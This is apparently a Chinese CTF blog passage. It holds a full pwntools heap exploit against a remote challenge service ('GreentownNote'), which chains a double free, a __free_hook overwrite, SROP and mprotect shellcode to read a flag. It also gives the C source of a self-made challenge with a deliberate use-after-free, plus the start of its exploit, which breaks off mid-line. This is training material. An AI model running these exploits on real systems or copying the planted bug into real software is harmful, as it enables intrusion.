<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;82.157.5.28&quot;</span></span><br><span class="line">port = <span class="number">50601</span></span><br><span class="line">r = remote(ip,port)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./GreentownNote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">c</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;AAAA&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr = leak - <span class="number">0x260</span></span><br><span class="line">success(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,p64(heap_addr+<span class="number">0x10</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;AAA&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;\x07&#x27;</span>*<span class="number">0x40</span>)<span class="comment">#3-》0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fh = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + libc_base +<span class="number">53</span></span><br><span class="line">syscall = <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)))+libc_base</span><br><span class="line">success(<span class="built_in">hex</span>(leak))</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;\x07&#x27;</span>*<span class="number">0x80</span>+p64(fh))</span><br><span class="line">add(<span class="number">0x90</span>,p64(setcontext))</span><br><span class="line"></span><br><span class="line">fake_rsp = fh&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_rsp))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=fake_rsp</span><br><span class="line">frame.rdx=<span class="number">0x2000</span></span><br><span class="line">frame.rsp=fake_rsp</span><br><span class="line">frame.rip=syscall</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(frame))</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="built_in">str</span>(frame))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">prdi_ret = libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">prsi_ret = libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">prdx_ret = libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">prax_ret = libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">jmp_rsp = libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">mprotect_addr = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(prdi_ret)+p64(fake_rsp)</span><br><span class="line">payload += p64(prsi_ret)+p64(<span class="number">0x1000</span>)</span><br><span class="line">payload += p64(prdx_ret)+p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(prax_ret)+p64(<span class="number">10</span>)</span><br><span class="line">payload += p64(syscall) <span class="comment">#mprotect(fake_rsp,0x1000,7)</span></span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,fake_rsp+<span class="number">0x300</span>,<span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,fake_rsp+<span class="number">0x300</span>,<span class="number">0x100</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>记一次自己出的REPWN</title>
    <url>/2021/09/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84REPWN/</url>
    <content><![CDATA[<p>自己最近在学逆向，想着把re和pwn结合，结果因为pwn的问题反而困扰了自己很久，好在最后搞定了。</p>
<span id="more"></span>

<p>题目部署平台Ubuntu18.04</p>
<p>题目源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_BLA  printf(<span class="meta-string">&quot;\033[30m&quot;</span>); <span class="comment">//黑色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_RED  printf(<span class="meta-string">&quot;\033[31m&quot;</span>); <span class="comment">//红色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_GRE  printf(<span class="meta-string">&quot;\033[32m&quot;</span>); <span class="comment">//绿色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_YEL  printf(<span class="meta-string">&quot;\033[33m&quot;</span>); <span class="comment">//黄色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_BLU  printf(<span class="meta-string">&quot;\033[34m&quot;</span>); <span class="comment">//蓝色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_PUR  printf(<span class="meta-string">&quot;\033[35m&quot;</span>); <span class="comment">//紫色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_CYA  printf(<span class="meta-string">&quot;\033[36m&quot;</span>); <span class="comment">//青色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_FONT_WHI  printf(<span class="meta-string">&quot;\033[37m&quot;</span>); <span class="comment">//白色</span></span></span><br><span class="line"><span class="comment">/*设置输出背景色*/</span> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_BLA  printf(<span class="meta-string">&quot;\033[40m&quot;</span>); <span class="comment">//黑色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_RED  printf(<span class="meta-string">&quot;\033[41m&quot;</span>); <span class="comment">//红色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_GRE  printf(<span class="meta-string">&quot;\033[42m&quot;</span>); <span class="comment">//绿色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_YEL  printf(<span class="meta-string">&quot;\033[43m&quot;</span>); <span class="comment">//黄色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_BLU  printf(<span class="meta-string">&quot;\033[44m&quot;</span>); <span class="comment">//蓝色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_PUR  printf(<span class="meta-string">&quot;\033[45m&quot;</span>); <span class="comment">//紫色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_CYA  printf(<span class="meta-string">&quot;\033[46m&quot;</span>); <span class="comment">//青色</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BACK_WHI  printf(<span class="meta-string">&quot;\033[47m&quot;</span>); <span class="comment">//白色</span></span></span><br><span class="line"><span class="comment">/*输出属性设置*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_REC  printf(<span class="meta-string">&quot;\033[0m&quot;</span>);  <span class="comment">//重新设置属性到缺省设置 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_BOL  printf(<span class="meta-string">&quot;\033[1m&quot;</span>); <span class="comment">//设置粗体 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_LIG  printf(<span class="meta-string">&quot;\033[2m&quot;</span>);  <span class="comment">//设置一半亮度(模拟彩色显示器的颜色) </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_LIN  printf(<span class="meta-string">&quot;\033[4m&quot;</span>);  <span class="comment">//设置下划线(模拟彩色显示器的颜色) </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_GLI  printf(<span class="meta-string">&quot;\033[5m&quot;</span>);  <span class="comment">//设置闪烁 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_REV  printf(<span class="meta-string">&quot;\033[7m&quot;</span>);  <span class="comment">//设置反向图象 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_THI  printf(<span class="meta-string">&quot;\033[22m&quot;</span>); <span class="comment">//设置一般密度 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_ULIN  printf(<span class="meta-string">&quot;\033[24m&quot;</span>);<span class="comment">//关闭下划线 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_UGLI  printf(<span class="meta-string">&quot;\033[25m&quot;</span>);<span class="comment">//关闭闪烁 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ATTR_UREV  printf(<span class="meta-string">&quot;\033[27m&quot;</span>);<span class="comment">//关闭反向图象</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">  ret = read(<span class="number">0</span>, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;法诀无效\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *heaparray[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> magic = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drink_tea</span><span class="params">( <span class="keyword">int</span> *v, <span class="keyword">int</span> <span class="keyword">const</span> *key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;<span class="comment">//xtea算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_this</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> flag1[<span class="number">20</span>]=&#123;<span class="number">-1374563276</span>,<span class="number">260139749</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> flag2[<span class="number">20</span>]=&#123;<span class="number">200106999</span>,<span class="number">-740235093</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">the_source</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> v[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;密令壹:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;密令貮:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  drink_tea(v,k);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;本源法诀已构建至心海!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0==[IIIIIIIIIIII众生皆蝼蚁IIIIIIIIIIIIIIII&gt;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++壹.构建法诀+++++++++++++++++\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++貮.修改法诀+++++++++++++++++\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++叁.演示法诀+++++++++++++++++\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++肆.摧毁法诀+++++++++++++++++\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++伍.本源法诀+++++++++++++++++\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++陆.收起法卷+++++++++++++++++\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0==[IIIIIIIIIIII独我步青云IIIIIIIIIIIIIIII&gt;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_heap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!heaparray[i]) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;输入法诀的大小:\n&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span>(size&gt;<span class="number">0x80</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      heaparray[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> (!heaparray[i]) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;禁止空法诀生成!!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入法诀内容:&quot;</span>);</span><br><span class="line">      read_input(heaparray[i], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;法诀构建完毕!\n&quot;</span>);</span><br><span class="line">      num++;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_heap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;选择您要修改的法诀:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">  idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;超出法诀数量范围!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (heaparray[idx]) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入您要修改的法诀大小:\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8</span>);</span><br><span class="line">    size = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span>(size&gt;<span class="number">0x80</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入您要修改的法诀内容\n&quot;</span>);</span><br><span class="line">    read_input(heaparray[idx], size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;法诀修改完毕!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;法诀选择错误！！！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_heap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请选择您要摧毁的法诀:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">  idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;超出法诀数量范围!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (heaparray[idx]) &#123;</span><br><span class="line">    <span class="built_in">free</span>(heaparray[idx]);</span><br><span class="line">    <span class="comment">//heaparray[idx] = NULL;</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;法诀摧毁完成\n&quot;</span>);</span><br><span class="line">    num--;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;法诀选择错误！！！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_item</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (heaparray[i]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;法诀序号: %d\n法诀内容: %s&quot;</span>, i, heaparray[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> choice[<span class="number">8</span>];</span><br><span class="line">  PRINT_FONT_YEL;</span><br><span class="line">  PRINT_BACK_PUR;</span><br><span class="line">  PRINT_ATTR_BOL;</span><br><span class="line">  PRINT_ATTR_THI;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;天界终焉之战降至，为了面对众天帝的围攻，你决定连夜用规则之力构建法诀\n&quot;</span>);</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;您当前的选择是:\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,choice,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">switch</span>(atoi(choice))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:create_heap();<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:edit_heap();<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:show_item();<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:delete_heap();<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:the_source();<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:<span class="built_in">printf</span>(<span class="string">&quot;啊？能不能好好选哦?\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./smallgod&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./smallgod&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;内容\n&quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span 